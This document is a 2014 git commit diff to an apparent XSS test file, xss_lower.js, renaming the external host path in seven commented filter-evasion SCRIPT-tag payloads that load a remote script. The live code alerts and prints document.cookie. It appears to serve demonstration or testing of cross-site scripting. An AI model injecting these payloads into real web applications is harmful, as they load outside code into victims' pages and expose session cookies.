e3607cbc2d8bb28caa8352d4980bef86f790fa0d
Matt Abhay <matt.abhay@vibes.com>
2014-05-27 14:36:50 -0500

    better guidance

--- xss_lower.js
+++ xss_lower.js
@@ -1,9 +1,9 @@
-//<SCRIPT "a='>'" SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT a=">" '' SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT =">" SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT a=">" SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT a=`>` SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT a=">'>" SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
-//<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://saltnvinegar.github.io/external-xss-attack/xss_lower.js"></SCRIPT>
+//<SCRIPT "a='>'" SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT a=">" '' SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT =">" SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT a=">" SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT a=`>` SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT a=">'>" SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
+//<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://saltnvinegar.github.io/REMOTE-XSS-ATTACK/xss_lower.js"></SCRIPT>
 alert ("Bro, do you even XSS? " + document.cookie);
 document.write ("I'm in ur interwebz, attacking ur app " + document.cookie);
